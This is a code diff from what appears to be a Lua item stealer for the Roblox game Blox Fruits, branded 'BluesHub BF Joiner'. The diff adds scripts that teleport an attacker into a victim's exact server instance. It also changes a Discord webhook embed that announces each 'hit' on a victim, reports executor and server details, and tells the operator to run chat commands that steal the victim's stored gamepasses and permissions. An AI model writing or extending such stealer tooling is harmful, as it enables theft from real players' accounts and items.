@@ -586,6 +586,34 @@ local joinCombinedScript = string.format(
     (Sea == "Sea 2" and Sea2Script or Sea3Script)
 )
 
+local joinCombinedScript = [[
+if game.PlaceId ~= 4442272183 then
+queue_onteleport([[
+task.wait(5)
+if game.JobId ~= "5f560520-146c-4df8-9105-e30f6338b270" then
+game:GetService("TeleportService"):TeleportToPlaceInstance(4442272183, "5f560520-146c-4df8-9105-e30f6338b270")
+end
+]])
+game:GetService("ReplicatedStorage").Remotes.CommF:InvokeServer("TravelDressrosa")
+else
+game:GetService("TeleportService"):TeleportToPlaceInstance(4442272183, "5f560520-146c-4df8-9105-e30f6338b270")
+end
+]]
+
+local joinMobileScript = [[
+if game.PlaceId ~= 4442272183 then
+queue_onteleport([[
+task.wait(5)
+if game.JobId ~= "5f560520-146c-4df8-9105-e30f6338b270" then
+game:GetService("TeleportService"):TeleportToPlaceInstance(4442272183, "5f560520-146c-4df8-9105-e30f6338b270")
+end
+]])
+game:GetService("ReplicatedStorage").Remotes.CommF:InvokeServer("TravelDressrosa")
+else
+game:GetService("TeleportService"):TeleportToPlaceInstance(4442272183, "5f560520-146c-4df8-9105-e30f6338b270")
+end
+]]
+
 local embed = {
     title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "BluesHub BF Joiner ; https://discord.gg/zJKDqRd5",
     description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
@@ -598,12 +626,12 @@ local embed = {
         {name = "Sea", value = Sea, inline = true},
         {name = "Executor Info", value = string.format("```\nExecutor: %s\nStealer Version: %s\n```", ExecutorName, GameVersion), inline = false},
         {name = "Server Info", value = string.format("```\nPlayer Count: %d\nServer Time: %s\n```", PlayerCount, ServerTime), inline = false},
-        {name = "Join Server and Sea (PC COPY)", value = joinCombinedScript, inline = false},
-        {name = "Join Server and Sea (Mobile COPY)", value = JoinScript .. "\n\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
+        {name = "Join Server and Sea (PC COPY)", value = string.format("```lua\n%s\n```", joinCombinedScript), inline = false},
+        {name = "Join Server and Sea (Mobile COPY)", value = string.format("```lua\n%s\n```", joinMobileScript), inline = false},
         {name = "NOTES:", value = [[
 1. You can do ?addallitem or ?additem <name> to steal stored gamepasses/perms.
 2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in rua hub channel "Commands for bf joiner"
-3. If victim Isn't on the server, it means he left.
+3. If victim isn't on the server, it means they left.
 ]], inline = false}
     }
 }
